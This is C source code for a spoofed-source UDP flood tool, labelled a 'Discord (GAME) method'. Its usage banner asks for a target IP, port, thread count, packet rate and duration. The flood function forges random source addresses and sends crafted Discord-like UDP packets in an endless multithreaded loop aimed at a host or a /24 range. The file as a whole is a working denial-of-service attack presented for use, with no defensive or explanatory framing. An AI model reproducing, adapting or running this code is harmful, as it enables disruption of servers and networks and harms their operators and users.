#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

#include <fcntl.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#define BUFFER_SIZE 1024

static unsigned int port;
static unsigned int sport;
static unsigned int lench;

char* packetstrx;
static uint32_t Q[4096], c = 362436;
struct thread_data { int thread_id; struct list* list_node; struct sockaddr_in sin; };
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

char sip[16] = "0";
char tip[16];
int s1, s2, s3, s4, s5;
int t1, t2, t3, t4, t5, t6, t7;

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

unsigned short csum(unsigned short* ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return(answer);
}

void* flood(void* par1) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (s == -1) {
        perror("Paket Acilmadi.");
        exit(1);
    }

    char datagram[4096], source_ip[32], classip[32], *data, *pseudogram;
    memset(datagram, 0, 4096);
    struct iphdr* iph = (struct iphdr*)datagram;
    struct udphdr* udph = (struct udphdr*)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    sscanf(tip, "%d.%d.%d.%d/%d/%d/%d", &t1, &t2, &t3, &t4, &t5, &t6, &t7);

    int i = 0;

    int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + lench;

    pseudogram = malloc(psize);

    memcpy((void*)udph + sizeof(struct udphdr), packetstrx, lench);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + lench;
    iph->id = htonl(rand() % 54321);
    iph->frag_off = 0;
    iph->ttl = 128;
    iph->protocol = 17;
    iph->check = 0;

    while (1) {
        snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);

        sin.sin_family = AF_INET;
        sin.sin_port = htons(80);

        if (t5 == 24) {
            snprintf(classip, sizeof(classip) - 1, "%d.%d.%d.%d", t1, t2, t3, rand() % (t7 + 1 - t6) + t6);
            sin.sin_addr.s_addr = inet_addr(classip);
        } else {
            sin.sin_addr.s_addr = inet_addr(tip);
        }

        iph->saddr = inet_addr(source_ip);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short*)datagram, iph->tot_len);

        udph->source = htons(50000 + rand() % (65535 - 50000));

        if (port == 0) {
            udph->dest = htons(1 + rand() % 15000); 
        } else {
            udph->dest = port;
        }
        udph->len = htons(sizeof(struct udphdr) + lench);
        udph->check = 0;
        psh.source_address = inet_addr(source_ip);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_UDP;
        psh.udp_length = htons(sizeof(struct udphdr) + lench);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + lench);
        udph->check = csum((unsigned short*)pseudogram, psize);
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));
        pps++;

        if (i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Discord (GAME) method\n");
        fprintf(stdout, "Example: %s 1.1.1.1 50005 1 (250000 or -1) 120\n", argv[0]);
        fprintf(stdout, "Usage: %s <ip> <port> <threads> <pps> <time>\n", argv[0]);
        exit(-1);
    }

    int i = 0;
    int max_len = 128;
    char* buffer = (char*)malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[3]);
    int maxpps = atoi(argv[4]);
    limiter = 0;
    pps = 0;
    int multiplier = 20;
    pthread_t thread[num_threads];
    struct thread_data td[num_threads];
    port = htons(atoi(argv[2]));
    strcpy(tip, argv[1]);
    
    lench = 16;
    packetstrx = malloc(lench);
    memset(packetstrx, 0x00, lench);
    packetstrx = "\x13\x37\xca\xfe\x01\x00\x00\x00\x00\x64\x69\x73\x63\x6f\x72\x64";

    for (i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
    }

    fprintf(stdout, "Attack Sent!\n");
    for (i = 0; i < (atoi(argv[5]) * multiplier); i++) {
        usleep((1000 / multiplier) * 1000);
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) {
                sleeptime += 100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if (sleeptime > 25) {
                sleeptime -= 25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }

    return 0;
}
